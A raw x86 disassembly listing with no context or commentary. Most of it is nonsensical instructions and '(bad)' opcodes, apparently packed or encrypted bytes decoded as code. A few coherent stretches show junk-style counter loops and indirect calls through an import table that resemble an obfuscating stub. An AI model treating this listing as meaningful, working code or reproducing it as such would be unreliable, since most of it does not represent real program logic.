  4020ab:	mov    dh,0xdd
  4020ad:	std    
  4020ae:	inc    edi
  4020af:	sbb    al,BYTE PTR [eax+0x1519ec74]
  4020b5:	mov    edx,DWORD PTR [edx]
  4020b7:	(bad)  
  4020b8:	leave  
  4020b9:	outs   dx,BYTE PTR ds:[esi]
  4020ba:	add    eax,DWORD PTR [ebp-0x45524753]
  4020c0:	fistp  WORD PTR [edi+0x1e]
  4020c3:	dec    esp
  4020c4:	(bad)  
  4020c5:	push   ebp
  4020c6:	push   ebx
  4020c7:	sbb    eax,0xb7a3e53a
  4020cc:	call   0xfa08:0xd3b4
  4020d2:	sub    edi,ebx
  4020d4:	retf   
  4020d5:	mov    eax,ds:0x199fc7f0
  4020da:	xor    al,0xd0
  4020dc:	loop   0x402140
  4020de:	and    eax,esp
  4020e0:	clc    
  4020e1:	jno    0x4020fa
  4020e3:	mov    esp,0x6e70aeb1
  4020e8:	dec    ecx
  4020e9:	push   es
  4020ea:	and    eax,0x4167f581
  4020ef:	pop    es
  4020f0:	pushf  
  4020f1:	pop    es
  4020f2:	push   ss
  4020f3:	mov    al,ds:0x97bd3730
  4020f8:	cli    
  4020f9:	push   ss
  4020fa:	in     al,dx
  4020fb:	shr    DWORD PTR [esi+eiz*1+0x5a6c6567],cl
  402102:	fcmovnbe st,st(1)
  402104:	fcmovnb st,st(7)
  402106:	jb     0x402173
  402108:	xchg   esi,eax
  402109:	cmc    
  40210a:	dec    ebx
  40210b:	mov    dh,0xf3
  40210d:	mov    bh,0x8f
  40210f:	adc    DWORD PTR [ecx+eiz*2-0x9c477f5],eax
  402116:	(bad)  
  402117:	(bad)  
  402118:	aaa    
  402119:	push   ebx
  40211a:	sbb    al,0xcf
  40211c:	mov    bh,0x62
  40211e:	test   eax,0x72d5299e
  402123:	(bad)  
  402124:	cmp    esi,DWORD PTR [eax+0x2b32256b]
  40212a:	or     eax,0x78613732
  40212f:	data16 out 0xee,al
  402132:	mov    ds:0x4710c249,al
  402137:	mov    ds:0xbba02f60,eax
  40213c:	ds scas al,BYTE PTR es:[edi]
  40213e:	(bad)  
  402140:	pop    ss
  402141:	fidivr DWORD PTR [edx-0x791bacf6]
  402147:	add    edx,DWORD PTR [ecx-0x2b]
  40214a:	out    dx,eax
  40214b:	sub    DWORD PTR [eax-0x350469fa],ecx
  402151:	adc    BYTE PTR [ecx],bh
  402153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402154:	or     DWORD PTR [esi-0x4beb0fe7],ebp
  40215a:	mov    edx,0x4299c166
  40215f:	call   eax
  402161:	scas   eax,DWORD PTR es:[edi]
  402162:	add    al,0xaf
  402164:	fst    QWORD PTR [ebp-0x10f357e7]
  40216a:	jge    0x4021e6
  40216c:	shl    DWORD PTR [ecx-0x53],1
  40216f:	jg     0x4021e8
  402171:	gs stos DWORD PTR es:[edi],eax
  402173:	les    ax,DWORD PTR [edi-0x1e]
  402177:	jp     0x402105
  402179:	sbb    BYTE PTR [ecx+eax*4],cl
  40217c:	sbb    al,0x8b
  40217e:	pop    es
  40217f:	push   ebp
  402180:	inc    esp
  402181:	call   0x26eedff0
  402186:	test   DWORD PTR [esi],ecx
  402188:	cmp    al,0x35
  40218a:	and    eax,0x3f69f073
  40218f:	sub    DWORD PTR [edx-0x3790a851],0xe2f1ede3
  402199:	sub    al,cl
  40219b:	pop    edi
  40219c:	mov    ecx,0xe5521225
  4021a1:	jecxz  0x402190
  4021a3:	hlt    
  4021a4:	inc    esi
  4021a5:	xchg   esi,eax
  4021a6:	cmp    BYTE PTR [eax+0x789fa4a5],al
  4021ac:	fnstcw WORD PTR [ecx-0x27]
  4021af:	sbb    DWORD PTR [edx+0x7284c961],ecx
  4021b5:	std    
  4021b6:	push   ebx
  4021b7:	mov    esi,DWORD PTR [esi-0x25]
  4021ba:	or     BYTE PTR [ecx],dh
  4021bc:	jle    0x4021f8
  4021be:	mov    bl,0xa0
  4021c0:	and    BYTE PTR [eax],dl
  4021c2:	mov    esp,0xafe3aa7b
  4021c7:	and    dl,ah
  4021c9:	xchg   edi,eax
  4021ca:	and    BYTE PTR [ebx-0x5e12182],dh
  4021d0:	inc    BYTE PTR [edi+0x3095b8b6]
  4021d6:	pop    esi
  4021d7:	mov    ds:0x281ebf5,eax
  4021dc:	add    BYTE PTR [ebp-0x6],bl
  4021df:	or     DWORD PTR ds:0x1763a892,ebp
  4021e5:	fs and BYTE PTR ds:[eax],ch
  4021e9:	xor    DWORD PTR [ecx],esi
  4021eb:	xchg   edx,eax
  4021ec:	inc    esp
  4021ed:	loope  0x402199
  4021ef:	push   edx
  4021f0:	test   al,0x54
  4021f2:	dec    eax
  4021f3:	cmp    esp,DWORD PTR [ecx+0x17]
  4021f6:	sub    cl,ch
  4021f8:	cmp    DWORD PTR [ebp+esi*8-0x4f],edi
  4021fc:	aad    0xae
  4021fe:	sbb    bl,BYTE PTR [ebp-0x1]
  402201:	popa   
  402202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402203:	out    dx,eax
  402204:	(bad)  
  402205:	in     eax,dx
  402206:	std    
  402207:	out    0x7d,al
  402209:	jle    0x402247
  40220b:	push   edi
  40220c:	ret    
  40220d:	pop    esi
  40220e:	push   eax
  40220f:	ret    0xb47a
  402212:	push   edi
  402213:	xor    DWORD PTR [ebx+0xd],0xfffffff2
  402217:	shl    DWORD PTR [ebx],0x14
  40221a:	daa    
  40221b:	test   eax,0x5408d2cc
  402220:	outs   dx,BYTE PTR ds:[esi]
  402221:	sar    DWORD PTR [edi],cl
  402223:	pop    ecx
  402224:	cmp    eax,0xc52aa156
  402229:	sbb    cl,dl
  40222b:	(bad)  
  40222c:	jl     0x402204
  40222e:	xchg   ebx,eax
  40222f:	mov    eax,0x9da39fb9
  402234:	cli    
  402235:	sbb    eax,0x406fe5a1
  40223a:	(bad)  
  40223c:	aad    0x2d
  40223e:	push   esp
  40223f:	dec    eax
  402240:	inc    ebx
  402241:	jne    0x4021cf
  402243:	(bad)  
  402244:	pusha  
  402245:	mov    eax,0x2af170ce
  40224a:	mov    WORD PTR [edx],ss
  40224c:	jnp    0x40228c
  40224e:	cmp    eax,0x2e3488b4
  402253:	test   al,0xf4
  402255:	ins    DWORD PTR es:[edi],dx
  402256:	lahf   
  402257:	(bad)  
  402258:	jge    0x402225
  40225a:	arpl   WORD PTR [edx],di
  40225c:	int    0xc3
  40225e:	xchg   edx,eax
  40225f:	fwait
  402260:	jge    0x4022cb
  402262:	std    
  402263:	xchg   ebp,eax
  402264:	dec    ebp
  402265:	cmp    ebp,DWORD PTR [esi+0x7c]
  402268:	or     BYTE PTR [ebx],dl
  40226a:	enter  0xc456,0x4b
  40226e:	ins    BYTE PTR es:[edi],dx
  40226f:	adc    dl,BYTE PTR [eax]
  402271:	stc    
  402272:	sub    eax,0xfd8571a5
  402277:	ins    BYTE PTR es:[edi],dx
  402278:	lea    edx,[esi-0x72]
  40227b:	ficomp DWORD PTR [ebx+0x38]
  40227e:	call   0xad3db6df
  402283:	sbb    DWORD PTR ds:[eax],edx
  402286:	enter  0x8ae,0xec
  40228a:	or     eax,DWORD PTR [eax-0x39]
  40228d:	pop    ss
  40228e:	ds sbb al,0x4
  402291:	or     BYTE PTR [edx+0x78c5175b],0xac
  402298:	add    ebx,0xf009a652
  40229e:	leave  
  40229f:	idiv   DWORD PTR [edx]
  4022a1:	mov    al,0x2a
  4022a3:	xchg   edx,eax
  4022a4:	sub    eax,0xb21ec555
  4022a9:	mov    bh,0xc6
  4022ab:	test   BYTE PTR [edi-0x49],0xb
  4022af:	sub    eax,0x331b6b2
  4022b4:	retf   0xc7f5
  4022b7:	pop    edx
  4022b8:	dec    ecx
  4022b9:	ret    
  4022ba:	(bad)  
  4022bb:	add    edx,edx
  4022bd:	jl     0x402307
  4022bf:	pop    ds
  4022c0:	pop    ss
  4022c1:	fadd   QWORD PTR [ebx-0x4a]
  4022c4:	ja     0x40225e
  4022c6:	add    eax,0xe89a3913
  4022cc:	cs inc ecx
  4022ce:	cld    
  4022cf:	mov    ebp,0xb5ad1e82
  4022d4:	fstp   DWORD PTR [ebp+0x6a66c3d7]
  4022da:	or     ebx,DWORD PTR [edx]
  4022dc:	mov    es,WORD PTR [ebp+0x3d]
  4022df:	sahf   
  4022e0:	pop    esp
  4022e1:	mov    eax,ds:0x19240c8d
  4022e6:	test   ch,al
  4022e8:	test   BYTE PTR ds:0x426b45d6,dh
  4022ee:	or     al,0x9a
  4022f0:	(bad)  
  4022f1:	sti    
  4022f2:	shl    bh,1
  4022f4:	mov    bh,0x6e
  4022f6:	sti    
  4022f7:	mov    WORD PTR cs:[ecx-0x1],?
  4022fb:	ret    
  4022fc:	psllw  mm6,QWORD PTR [eax-0x4c]
  402300:	pop    ebp
  402301:	xchg   BYTE PTR [edx-0x24],bl
  402304:	xlat   BYTE PTR ds:[ebx]
  402305:	and    eax,0xfd75dbd
  40230a:	mov    cl,0x51
  40230c:	add    al,0x42
  40230e:	stc    
  40230f:	sbb    BYTE PTR [ecx-0x56],ch
  402312:	or     DWORD PTR [ebp+0x14166b00],esi
  402318:	stos   BYTE PTR es:[edi],al
  402319:	rol    BYTE PTR [eax+0x46],1
  40231c:	mov    BYTE PTR [edx],ah
  40231e:	call   0x3d372b8
  402323:	enter  0x8d05,0x48
  402327:	int3   
  402328:	int3   
  402329:	ins    DWORD PTR es:[edi],dx
  40232a:	xor    BYTE PTR [eax+edi*2],dl
  40232d:	arpl   WORD PTR [edi+0x68],ax
  402330:	stc    
  402331:	(bad)  [ebp-0x70cdfcc0]
  402337:	shr    bl,1
  402339:	fldenv [esi]
  40233b:	cmp    cl,BYTE PTR [ebx+0x1097100b]
  402341:	sub    edx,ebx
  402343:	jecxz  0x40230d
  402345:	mov    edx,0xbf62dac2
  40234a:	xchg   esi,eax
  40234b:	add    al,0xf4
  40234d:	xlat   BYTE PTR ds:[ebx]
  40234e:	jb     0x402361
  402350:	test   eax,0x8a49a08e
  402355:	test   al,0x37
  402357:	dec    eax
  402358:	aam    0x8d
  40235a:	test   DWORD PTR [eax-0x1],ebp
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x2fc4ac70]
  402480:	das    
  402481:	mov    ah,0xba
  402483:	add    DWORD PTR [esi+0x7e],edi
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	jge    0x402507
  402489:	jle    0x4024e2
  40248b:	xor    DWORD PTR [eax+0x6082bd88],0xf5836d55
  402495:	and    esp,DWORD PTR [esi-0x660a1309]
  40249b:	(bad)  
  40249c:	pop    ss
  40249d:	(bad)  
  40249f:	idiv   DWORD PTR [edi-0x50144071]
  4024a5:	push   esi
  4024a6:	(bad)  
  4024a7:	rcl    BYTE PTR [esi+0x3166e609],0x35
  4024ae:	int3   
  4024af:	jae    0x402456
  4024b1:	inc    esi
  4024b2:	not    BYTE PTR [ecx+0x4b84fcf8]
  4024b8:	cmp    al,0x1c
  4024ba:	adc    bl,BYTE PTR [edx]
  4024bc:	xor    DWORD PTR [ebx-0x3653284f],0xffffffad
  4024c3:	pop    edi
  4024c4:	jo     0x4024e0
  4024c6:	add    eax,0xd402cf5e
  4024cb:	imul   ecx,esi,0x135ad56b
  4024d1:	or     BYTE PTR [edx+esi*8+0x641433a2],dh
  4024d8:	sub    al,0x2c
  4024da:	rol    edx,cl
  4024dc:	pop    edi
  4024dd:	lods   al,BYTE PTR ds:[esi]
  4024de:	cld    
  4024df:	xor    DWORD PTR [esi+0x7e],eax
  4024e2:	ja     0x4024d6
  4024e4:	ret    
  4024e5:	or     dl,BYTE PTR [eax+0x51]
  4024e8:	inc    esi
  4024e9:	test   DWORD PTR [ecx],ecx
  4024eb:	jge    0x40253e
  4024ed:	fwait
  4024ee:	ins    BYTE PTR es:[edi],dx
  4024ef:	mov    dl,BYTE PTR [ebx+0x11]
  4024f2:	pop    esi
  4024f3:	cli    
  4024f4:	das    
  4024f5:	mov    ah,0x91
  4024f7:	test   WORD PTR ds:0xcffaf32f,di
  4024fe:	cwde   
  4024ff:	sub    eax,0xa2598826
  402504:	jae    0x40253f
  402506:	rcl    BYTE PTR [ebp-0x2658cd19],0xe1
  40250d:	sbb    bl,BYTE PTR [ebp-0x51]
  402510:	call   0x2493f936
  402515:	call   0x2a50d81
  40251a:	jmp    0xcec1:0xb27d640e
  402521:	inc    ebx
  402522:	pop    ebp
  402523:	pop    esi
  402524:	adc    eax,0xff5d4483
  402529:	mov    edx,ebp
  40252b:	retf   0x8134
  40252e:	lock into 
  402530:	push   ds
  402531:	dec    esi
  402532:	mov    dl,0x9e
  402534:	loope  0x402566
  402536:	mov    ds:0x34c40bd,eax
  40253b:	mov    eax,ds:0x367d60b3
  402540:	stos   DWORD PTR es:[edi],eax
  402541:	xchg   DWORD PTR [ecx-0x2c],ebx
  402544:	mov    ecx,0xc9cb4559
  402549:	lods   eax,DWORD PTR ds:[esi]
  40254a:	inc    edx
  40254b:	loop   0x402516
  40254d:	sub    esp,DWORD PTR [eax]
  40254f:	(bad)  
  402550:	icebp  
  402551:	out    0x1b,eax
  402553:	ror    BYTE PTR [esi-0x36],cl
  402556:	inc    esp
  402557:	adc    al,0xbc
  402559:	ds dec ecx
  40255b:	(bad)  
  40255c:	mov    al,es:0xe413c3e8
  402562:	xlat   BYTE PTR ds:[ebx]
  402563:	xchg   ebp,eax
  402564:	aas    
  402565:	pop    ss
  402566:	or     al,0xce
  402568:	mov    eax,0x3c2c233b
  40256d:	or     al,0xf2
  40256f:	scas   eax,DWORD PTR es:[edi]
  402570:	dec    edx
  402571:	inc    edi
  402572:	mov    BYTE PTR [eax],dh
  402574:	imul   eax,DWORD PTR [edx-0x1c],0xffffffa1
  402578:	imul   ebx,DWORD PTR [esi+0x6d746a23],0x1e
  40257f:	retf   
  402580:	lds    eax,FWORD PTR [edi]
  402582:	pop    eax
  402583:	xchg   edx,eax
  402584:	add    dl,dh
  402586:	sbb    DWORD PTR [ebp-0x288baef5],0x2e97cbbf
  402590:	mov    eax,ds:0x83354e7d
  402595:	out    dx,al
  402596:	addr16 pop ds
  402598:	aaa    
  402599:	push   eax
  40259a:	fnstcw WORD PTR [ecx+eiz*1-0x68218486]
  4025a1:	cmc    
  4025a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025a3:	out    dx,al
  4025a4:	cmp    eax,0x630eb828
  4025a9:	(bad)  [eax-0x6585522b]
  4025af:	and    dl,BYTE PTR [ebp+esi*4-0x22]
  4025b3:	mov    ecx,0x5f2da36c
  4025b8:	xchg   ebp,eax
  4025b9:	pop    esp
  4025ba:	inc    ebp
  4025bb:	iret   
  4025bc:	mov    ah,0xbb
  4025be:	xor    DWORD PTR [ebx],0xdfefb48c
  4025c4:	frstor [edi+0x466aaf7e]
  4025ca:	push   esp
  4025cb:	pop    ebx
  4025cc:	lea    edx,[edx-0x757d247b]
  4025d2:	mov    al,0xdc
  4025d4:	xor    al,0xa4
  4025d6:	sete   BYTE PTR [esi]
  4025d9:	or     BYTE PTR [eax],0xee
  4025dc:	xchg   esi,eax
  4025dd:	ja     0x4025e7
  4025df:	sub    eax,0x8963bd0c
  4025e4:	pop    eax
  4025e5:	lods   al,BYTE PTR ds:[esi]
  4025e6:	sahf   
  4025e7:	xchg   DWORD PTR [edx-0x7e],eax
  4025ea:	xor    BYTE PTR [ebp-0x4c9f6591],ch
  4025f0:	adc    al,0xf7
  4025f2:	pop    edx
  4025f3:	push   edx
  4025f4:	push   ecx
  4025f5:	or     ebp,DWORD PTR [ecx+0x47]
  4025f8:	or     cl,BYTE PTR [edi-0x3]
  4025fb:	xchg   ebp,eax
  4025fc:	icebp  
  4025fd:	jle    0x402654
  4025ff:	(bad)  
  402600:	or     al,0x3b
  402602:	rcl    BYTE PTR [ebp-0x62a8deb6],1
  402608:	retf   0xd24c
  40260b:	or     BYTE PTR [esi+0x45bff427],dl
  402611:	call   0x3343:0x25dc1ea2
  402618:	xchg   ebp,eax
  402619:	push   0xaa4137fc
  40261e:	popf   
  40261f:	xor    ch,cl
  402621:	popa   
  402622:	mul    DWORD PTR [esi]
  402624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402625:	data16 jle 0x40262e
  402628:	je     0x4025fd
  40262a:	dec    ecx
  40262b:	jmp    0x40267e
  40262d:	bound  ecx,QWORD PTR [edx-0x9]
  402630:	add    ch,ch
  402632:	sub    BYTE PTR [edi],ah
  402634:	and    DWORD PTR [edi-0x3e],edx
  402637:	xor    BYTE PTR [ebx],dh
  402639:	or     BYTE PTR ss:[esi+0x48],ch
  40263d:	sub    eax,DWORD PTR cs:[edx-0x1b]
  402641:	sbb    eax,0xa7b210a8
  402646:	jl     0x4025cf
  402648:	xlat   BYTE PTR ds:[ebx]
  402649:	inc    ebp
  40264a:	out    dx,al
  40264b:	pop    edx
  40264d:	xor    esi,DWORD PTR [ebp+0x3ede38ef]
  402653:	add    DWORD PTR [ecx+0x47a49bb8],esp
  402659:	mov    eax,ds:0x4e0618e
  40265e:	cmp    dh,BYTE PTR [edi+eiz*4+0x5a]
  402662:	call   0xf62a15fc
  402667:	icebp  
  402668:	aas    
  402669:	jo     0x402620
  40266b:	xor    ebp,DWORD PTR [edi-0x69]
  40266e:	and    eax,DWORD PTR [edx-0x2af4424b]
  402674:	test   BYTE PTR [eax+0x5a95e61b],0xf9
  40267b:	push   0xc072c94b
  402680:	fidivr DWORD PTR [ecx+0x0]
  402683:	jbe    0x402645
  402685:	pop    ecx
  402686:	mov    ebp,0x8be055e8
  40268b:	cmp    al,0xa0
  40268d:	repz imul ecx,DWORD PTR [esi-0xa185fba],0x33
  402695:	pop    ebp
  402696:	cmp    DWORD PTR [ebx+eiz*1-0x36],ebp
  40269a:	sahf   
  40269b:	xchg   esp,eax
  40269c:	jbe    0x40266f
  40269e:	ja     0x402686
  4026a0:	inc    edi
  4026a1:	shr    BYTE PTR [ebx+0x3d],cl
  4026a4:	mov    al,0x38
  4026a6:	sub    cl,BYTE PTR [ebx]
  4026a8:	hlt    
  4026a9:	ins    BYTE PTR es:[edi],dx
  4026aa:	sar    BYTE PTR [ecx+0x5d],cl
  4026ad:	add    BYTE PTR [edi],ah
  4026af:	mov    eax,0x48c29eed
  4026b4:	push   esi
  4026b5:	xchg   esp,eax
  4026b6:	leave  
  4026b7:	inc    edx
  4026b8:	js     0x4026ee
  4026ba:	lods   al,BYTE PTR ds:[esi]
  4026bb:	mov    esp,DWORD PTR [edi+0x65]
  4026be:	xor    DWORD PTR [edi-0x7240eef],edi
  4026c4:	(bad)  
  4026c6:	fild   WORD PTR [edx]
  4026c8:	or     al,0x32
  4026ca:	sub    eax,0xfc46e336
  4026cf:	dec    eax
  4026d0:	push   edi
  4026d1:	inc    esp
  4026d2:	xor    al,0x2f
  4026d4:	test   BYTE PTR ds:0x6f99943f,al
  4026da:	or     BYTE PTR [esi],dl
  4026dc:	std    
  4026dd:	dec    ecx
  4026de:	mov    eax,ds:0xf4ff6976
  4026e3:	xrelease xchg DWORD PTR [edi-0x40],edi
  4026e7:	in     al,dx
  4026e8:	inc    eax
  4026e9:	mov    ah,0xf0
  4026eb:	cmp    ebp,DWORD PTR [ecx-0x2ad1be83]
  4026f1:	stos   DWORD PTR es:[edi],eax
  4026f2:	sub    BYTE PTR [edi+0x50],bl
  4026f5:	shl    BYTE PTR [ecx+ecx*8+0x4f],1
  4026f9:	sahf   
  4026fa:	sbb    bh,BYTE PTR [eax-0x60fcd7f8]
  402700:	xor    eax,0xfe69a1a5
  402705:	out    dx,eax
  402706:	popa   
  402707:	(bad)  
  402708:	dec    ebx
  402709:	fiadd  DWORD PTR [eax+eiz*8+0x48d6958a]
  402710:	inc    edx
  402711:	pusha  
  402712:	cli    
  402713:	dec    ebp
  402714:	es jno 0x4026ca
  402717:	dec    ebp
  402718:	mov    al,ds:0xb0f19c22
  40271d:	inc    eax
  40271e:	repz cli 
  402720:	jge    0x4026f5
  402722:	adc    eax,0x567c2b6e
  402727:	add    al,0x99
  402729:	xchg   ebp,eax
  40272a:	push   eax
  40272b:	int3   
  40272c:	(bad)  
  40272d:	(bad)  
  40272e:	cmp    al,0xec
  402730:	push   esp
  402731:	ret    
  402732:	(bad)  
  402733:	mov    ds:0xd9f83a99,al
  402738:	out    dx,al
  402739:	frstor [esi-0x4394e962]
  40273f:	inc    esp
  402740:	ins    BYTE PTR es:[edi],dx
  402741:	cmp    DWORD PTR [edx],0xfffffff1
  402744:	inc    eax
  402745:	mov    dh,0x53
  402747:	mov    dh,0x80
  402749:	das    
  40274a:	out    dx,al
  40274b:	repnz retf 0x11ad
  40274f:	add    al,0x15
  402751:	daa    
  402752:	or     cl,ah
  402754:	push   ecx
  402755:	fs xor al,0xb1
  402758:	pushf  
  402759:	xor    bl,al
  40275b:	aad    0x34
  40275d:	jns    0x4026f2
  40275f:	loopne 0x4027c9
  402761:	sub    al,0x68
  402763:	sub    eax,eax
  402765:	sbb    DWORD PTR [ebx-0x1e4421a8],esi
  40276b:	(bad)  
  40276c:	pop    DWORD PTR [ecx-0x5d589136]
  402772:	mov    ebp,0xa21fe8ec
  402777:	or     ah,bl
  402779:	test   DWORD PTR [ebx+0x18],esi
  40277c:	in     eax,dx
  40277d:	ss mov cl,0x96
  402780:	xchg   edx,eax
  402781:	push   esi
  402782:	pop    edi
  402783:	jns    0x4027f7
  402785:	xchg   ebp,eax
  402786:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402788:	jne    0x40279d
  40278a:	popa   
  40278b:	sbb    al,0x4f
  40278d:	hlt    
  40278e:	data16 cmp BYTE PTR [esi+ebx*2],al
  402792:	xchg   bh,bl
  402794:	(bad)
  402798:	xor    ah,BYTE PTR [esi+0x23a72954]
  40279e:	fwait
  40279f:	or     edi,ebx
  4027a1:	es out 0xe5,eax
  4027a4:	mov    cl,0x1a
  4027a6:	lds    eax,FWORD PTR [ebx-0xd]
  4027a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027aa:	add    edi,DWORD PTR [edi+0x74163808]
  4027b0:	aaa    
  4027b1:	cld    
  4027b2:	lods   al,BYTE PTR ds:[esi]
  4027b3:	std    
  4027b4:	mov    eax,0x2b85f5cb
  4027b9:	pop    edx
  4027ba:	adc    BYTE PTR [esp+esi*4+0x321bc132],ah
  4027c1:	push   es
  4027c2:	add    BYTE PTR [edx-0x66],ah
  4027c5:	scas   al,BYTE PTR es:[edi]
  4027c6:	ret    0x8d9b
  4027c9:	test   BYTE PTR [edx+0x25],cl
  4027cc:	adc    eax,DWORD PTR [ecx+0xc]
  4027cf:	cmp    ah,al
  4027d1:	sub    eax,0x6f5939a3
  4027d6:	mov    dh,0x98
  4027d8:	lock add edx,DWORD PTR [ecx]
  4027db:	dec    ebp
  4027dc:	(bad)  
  4027dd:	mov    bh,0x81
  4027df:	test   eax,0x68985781
  4027e4:	sub    ecx,ecx
  4027e6:	jg     0x4027aa
  4027e8:	(bad)  
  4027e9:	hlt    
  4027ea:	sub    al,0x73
  4027ec:	pushf  
  4027ed:	loope  0x402869
  4027ef:	push   cs
  4027f0:	cmp    eax,DWORD PTR [edx+0x32]
  4027f3:	fnstenv ds:0x3905d7e9
  4027f9:	out    dx,al
  4027fa:	cmp    eax,0xf9c79f0d
  4027ff:	fucom  st(7)
  402801:	sahf   
  402802:	mov    cl,0xfb
  402804:	xlat   BYTE PTR ds:[ebx]
  402805:	cwde   
  402806:	imul   ebx,DWORD PTR [eax-0x13],0xa7c4814b
  40280d:	nop
  40280e:	jmp    0x9dd1bff0
  402813:	xchg   ebx,eax
  402814:	xchg   edi,eax
  402815:	hlt    
  402816:	mov    al,0xf7
  402818:	clc    
  402819:	nop    edi
  40281c:	sub    bl,cl
  40281e:	popa   
  40281f:	mov    dh,0x10
  402821:	scas   al,BYTE PTR es:[edi]
  402822:	sbb    ch,BYTE PTR [ecx+ebp*2-0x5f]
  402826:	js     0x4028a7
  402828:	bound  esp,QWORD PTR [edi+0xf]
  40282b:	fnstcw WORD PTR [eax+0x18]
  40282e:	pop    ebx
  40282f:	imul   DWORD PTR [eax+0x51432ca9]
  402835:	or     DWORD PTR [ebp+0x9cfafbd],eax
  40283b:	mov    edx,ecx
  40283d:	data16 std 
  40283f:	aad    0x85
  402841:	push   esi
  402842:	xor    eax,0xc16a5fe3
  402847:	mov    ds:0x3ff4d206,al
  40284c:	sub    ebp,DWORD PTR [eax-0x6f]
  40284f:	(bad)  
  402850:	pop    ss
  402851:	fadd   DWORD PTR [ebx]
  402853:	in     al,0x2d
  402855:	icebp  
  402856:	xchg   esi,eax
  402857:	mov    ch,0xf8
  402859:	clc    
  40285a:	call   0x420f530d
  40285f:	sub    DWORD PTR [eax],0xffffff86
  402862:	xor    dh,cl
  402864:	push   edi
  402865:	push   esi
  402866:	sbb    al,0x55
  402868:	fstp   TBYTE PTR [edi-0x1d]
  40286b:	loopne 0x402852
  40286d:	enter  0x9d08,0x56
  402871:	outs   dx,BYTE PTR ds:[esi]
  402872:	sub    al,0xc9
  402874:	call   0xe0b4:0x4aeb158
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x301a7b93]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	das    
  4028cf:	and    eax,0x980e0569
  4028d4:	fisub  WORD PTR fs:[ebx]
  4028d7:	(bad)  
  4028d8:	(bad)  
  4028da:	or     BYTE PTR [edx],ah
  4028dc:	and    esi,edi
  4028de:	dec    edx
  4028df:	mov    dh,0x26
  4028e1:	fcom   DWORD PTR [ecx-0x36]
  4028e4:	imul   BYTE PTR es:[eax+0xb]
